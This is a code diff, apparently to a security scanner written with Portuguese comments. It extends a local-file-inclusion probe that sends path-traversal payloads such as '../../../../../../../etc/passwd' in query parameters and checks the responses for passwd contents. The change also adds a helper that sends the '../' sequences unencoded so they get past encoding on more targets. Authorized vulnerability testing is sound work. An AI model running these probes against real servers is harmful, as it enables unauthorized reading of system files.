@@ -18,6 +18,8 @@ const PHP_INJECT_PARAM_NAMES = [
   'inc',
 ];
 const PASSWD_PAYLOADS = [
+  /** Sem percent-encoding — o servidor vê barras literais (URLSearchParams codificaria %2F). */
+  '../../../../../../../etc/passwd',
   '/etc/passwd',
   '../etc/passwd',
   '../../etc/passwd',
@@ -44,6 +46,25 @@ const CONTEXT_PAYLOADS = [
 function looksLikePasswdDump(bodyText) {
   const t = String(bodyText || '').toLowerCase();
   return t.includes('root:x:0:0:') || t.includes('daemon:x:1:1:') || t.includes('/bin/bash') || t.includes('/usr/sbin/nologin');
+}
+
+/**
+ * Substitui ou acrescenta um parâmetro na query com valor **bruto** (não passa por `URLSearchParams` no valor),
+ * para LFI com `../` literal — `searchParams.set` codificaria `/` e quebraria muitos alvos.
+ * Os restantes parâmetros são re-serializados com `encodeURIComponent` no valor.
+ */
+function buildUrlWithRawSearchParam(baseHref, paramName, rawValue) {
+  const u = new URL(baseHref);
+  const key = String(paramName || '');
+  const sp = new URLSearchParams(u.search);
+  sp.delete(key);
+  const parts = [];
+  for (const [k, v] of sp.entries()) {
+    parts.push(`${encodeURIComponent(k)}=${encodeURIComponent(v)}`);
+  }
+  parts.push(`${encodeURIComponent(key)}=${String(rawValue)}`);
+  const h = u.hash || '';
+  return `${u.origin}${u.pathname}?${parts.join('&')}${h}`;
 }
 
 function uniqueQueryUrls(urls) {
@@ -117,9 +138,7 @@ export async function runLfiPasswdProbe({
       for (const payload of PASSWD_PAYLOADS) {
         if (attempts >= maxAttempts) break;
         attempts += 1;
-        const test = new URL(u.href);
-        test.searchParams.set(p, payload);
-        const testUrl = test.href;
+        const testUrl = buildUrlWithRawSearchParam(u.href, p, payload);
         try {
           logger(`[lfi] teste passwd: ${testUrl}`, 'info');
           const r = await curlWebSingle({ url: testUrl, timeoutMs, maxBodyBytes });
@@ -166,9 +185,7 @@ export async function runLfiPasswdProbe({
       for (const payload of PASSWD_PAYLOADS) {
         if (attempts >= maxAttempts) break;
         attempts += 1;
-        const test = new URL(u.href);
-        test.searchParams.set(paramName, payload);
-        const testUrl = test.href;
+        const testUrl = buildUrlWithRawSearchParam(u.href, paramName, payload);
         try {
           logger(`[lfi] .php+query inventada: ${testUrl}`, 'info');
           const r = await curlWebSingle({ url: testUrl, timeoutMs, maxBodyBytes });
